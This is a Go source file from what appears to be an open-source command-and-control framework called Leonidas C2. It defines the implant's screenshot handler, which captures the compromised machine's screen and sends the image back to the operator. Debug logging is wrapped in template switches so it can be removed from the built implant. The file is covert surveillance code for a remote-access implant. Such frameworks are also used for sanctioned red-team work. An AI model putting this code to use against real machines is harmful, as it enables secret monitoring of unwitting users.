//go:build (linux && (386 || amd64)) || (darwin && (amd64 || arm64)) || (windows && amd64)

package handlers

/*
	Leonidas C2 Framework
	Copyright (C) 2026  Leonidas C2 Project

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/leonidas-c2/leonidas/implant/leonidas/screen"
	"github.com/leonidas-c2/leonidas/protobuf/leonidaspb"
	"google.golang.org/protobuf/proto"
)

func screenshotHandler(data []byte, resp RPCResponse) {
	sc := &leonidaspb.ScreenshotReq{}
	err := proto.Unmarshal(data, sc)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Screenshot Request")
	// {{end}}
	scRes := &leonidaspb.Screenshot{}
	scRes.Data = screen.Screenshot()
	data, err = proto.Marshal(scRes)

	resp(data, err)
}
